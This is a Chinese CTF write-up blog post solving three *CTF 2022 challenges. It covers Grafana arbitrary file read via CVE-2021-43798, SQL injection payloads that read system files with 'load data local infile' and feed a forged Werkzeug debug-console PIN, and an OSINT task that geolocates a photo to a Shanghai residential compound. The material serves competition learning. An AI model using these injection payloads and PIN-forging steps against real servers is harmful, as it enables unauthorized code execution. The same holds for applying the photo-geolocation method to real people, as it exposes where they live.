---
title: ＊CTF 2022 WriteUp
date: 2022-04-17 14:00:33
categories:
  - CTF
---

虽然比赛时只做出来一道题，但确实玩的挺开心的，所以记录一下

## oh-my-grafana

该题用到了Grafana应用中最为广泛的一个CVE漏洞CVE-2021-43798，可以未授权通过Grafana的插件实现任意文件读取。

![](https://images.hujiekang.top/blogimage-c2f7ed834077bc4c895a65c86e22bd93-9791726c.png)

<!-- more -->

通过搜索获取到Grafana的配置文件路径`/etc/grafana/grafana.ini`，在里面翻到了管理员的帐号和密码（一开始我还以为不会这么简单，还去读取了一下Grafana的数据库，`/var/lib/grafana/grafana.db`）

![](https://images.hujiekang.top/blogimage-6c39f2967216f1ef4e5a5d3265d72cb0-27e6d01d.png)

然后利用后台的数据库查询工具，查询Grafana的数据库获得flag。

## oh-my-notepro

打开网站后是一个简单的笔记界面，创建账户登录进去之后就可以写笔记并且查看笔记：

![](https://images.hujiekang.top/blogimage-5e764c8c30f27f366589ebd5a36620dc-0844a84d.png)

点进去笔记详情页，很容易发现URL格式为`/view?note_id=at8k8cdp6874vqcvzifietexy4gtnpey`，尝试修改为不存在的note_id，产生报错，发现后端是Flask而且开启了调试模式，查看错误代码发现是SQL查询错误：

![](https://images.hujiekang.top/blogimage-5db5374c792dbce17c89746feb6e0256-d003a610.png)

于是尝试注入，发现轻松注进去，没有任何过滤：

![](https://images.hujiekang.top/blogimage-e71136b38ff86a773436366ea54f6219-758420f7.png)

但是翻看了一阵子数据库之后发现没什么有用的信息，且数据库为USAGE权限所以没法提权。翻看了一下其他的功能点，整个网站的功能也十分单一并没有发现额外的功能，所以接着把关注点放在了Flask的调试模式上。

注意到在报错代码的右侧有个小按钮，名为`Open an interactive python shell in this frame`，也就是可以直接起一个Python shell，但是需要一个Debug PIN才能解锁。

![](https://images.hujiekang.top/blogimage-ffb4e45342410bd8b6f0780a69710b3f-d4db71b6.png)

于是搜索发现这个PIN可以直接生成，参考文章<https://www.daehee.com/werkzeug-console-pin-exploit/>。文章中提到这个PIN是由四个公共变量和两个私有变量经过哈希生成的，也就是下面这一段：

```python
probably_public_bits = [
	'web3_user',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]
```

`probably_public_bits`中的用户名和Flask包路径分别在数据库和调试信息中可以获取到，接下来就剩下这两个私有的变量需要读取对应的文件才能获取到。一开始尝试用MySQL的LOAD_FILE来包含文件但是一直返回空值，赛后经群友指点学到了一个新的MySQL语法`LOAD DATA`（<https://dev.mysql.com/doc/refman/5.7/en/load-data.html>），可以直接将文件中的数据读取至表中。因为这个语句没法制定读进哪个列，所以读进已有的表似乎可能性不大（第一列都是ID，数据类型一转换就没了），尝试创建一个新表，发现可以创建，于是通过写入新表的方式可以获取到这些信息，Payload如下：

```http
/view?note_id=';create table test(`name` varchar(4096) null)--+
/view?note_id=';load data local infile '/etc/machine-id' into table test--+
/view?note_id=';load data local infile '/sys/class/net/eth0/address' into table test--+
/view?note_id=' union select 1,2,3,4,group_concat(name) from test--+
```

但获取到这些数据之后发现生成的PIN还是不正确，考虑到公共变量的值确实都是确定的，那么只可能是私有变量读错了或者生成方法有变化。于是翻看了最新的Werkzeug源码，果然发现生成的算法由MD5变成了SHA1，且获取的machine-id也并非只是`/etc/machine-id`的值。直接贴代码吧：

```python
def get_pin_and_cookie_name(
	# 省略部分初始化代码

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1() # 算法产生了变化
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    return rv, cookie_name

def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
    # 省略部分代码
    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""
        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break
        # 多获取了一个/proc/self/cgroup的值，拼合在machine-id的后面
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux
```

整明白了是原文中的Werkzeug版本不够新导致的生成方法错误之后，修改为最新版本的生成代码后，可直接获取到正确的PIN。最终的变量值类似下面这样：

```python
probably_public_bits = [
	'ctf',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    # str(uuid.getnode()),  /sys/class/net/eth0/address
	'2485723348995',
	# get_machine_id(), /etc/machine-id + /proc/self/cgroup
	'1cc402dd0e11d5ae18db04a6de87223d06264bc019cbb642bee07e9e221c738a0b4c0395f58f4672b187248f75fb53fc'
]
```

为了避免本身Web程序报错导致的可能Console也报错运行不了的问题，可以不用触发程序报错，直接访问`/console`直接进入无报错调试界面，调用`/readflag`即可获得flag。

![](https://images.hujiekang.top/blogimage-41a6464d9548a2efb5798063d44eab93-7203df7c.png)

## Today

> “I’m anninefour. I love machine learning and data science.
> Flag is in my pocket!”

第一次在CTF里面见到社工题，思路倒是没错，卡在了最后一步（麻了）

上面这段话中可以提取出两个信息：

1. 名称（可能是社交平台或者论坛的ID）：anninefour
2. 喜好：machine learning and data science

直接Google搜索anninefour并没有搜索出什么有意义的信息，在Twitter上有个ID为Annine4的，上次发帖时间为2013年（不会布局了这么久吧），于是开始搜索第二个信息。

搜索机器学习与数据科学相关的论坛和社区，Google第一项是一个叫Kaggle的社区：

![](https://images.hujiekang.top/blogimage-e11fac4e77d8cc7ed1cb28f552b10e85-747f1cc7.png)

然后去搜索anninefour这个用户，果然存在<https://www.kaggle.com/anninefour>：

![](https://images.hujiekang.top/blogimage-3fe00cec819873144bfe3fb90eef7a6e-ecd28583.png)

用户的个人页面中留了一个Twitter的地址<https://twitter.com/1liujing>，点进去看，唯一一条推文是一张图片：

![](https://images.hujiekang.top/blogimage-e090105333f69355f4f6ff4d3ab66514-add7d06c.png)

字面意思，让我们找他在哪。这张图中还是有很明显的特征的，比如对面的x夫果品生鲜超市、花山汤圆等等店铺。丢进地图去搜索，搜到一个农夫果品生鲜超市，在上海，结合推文中的lockdown（疫情封小区）描述以及百度地图中提供的全景和实拍图片，也就可以确定就是这个地址了。

![](https://images.hujiekang.top/blogimage-4d8849bbfb5301ca842792238861a488-466ace15.png)

接下来，从拍摄者的角度向路对面看，可以发现这个小区叫花山名苑，对比全景图，发现这个入口的保安亭也和照片中的一致。

![](https://images.hujiekang.top/blogimage-5de8d3f004d36cd6a9aeafed6d04bb12-da788014.png)

然后要去哪里找flag呢？因为一直通过百度地图来搜索信息的原因，没有想到出题人把flag放在了谷歌地图里面。。。在谷歌地图对花山名苑的名片中，可以加载到用户对该小区的评论，flag就放在这里：

![](https://images.hujiekang.top/blogimage-6eb6914da1bfdf1c0f31ebbce05f2485-664b6c49.png)
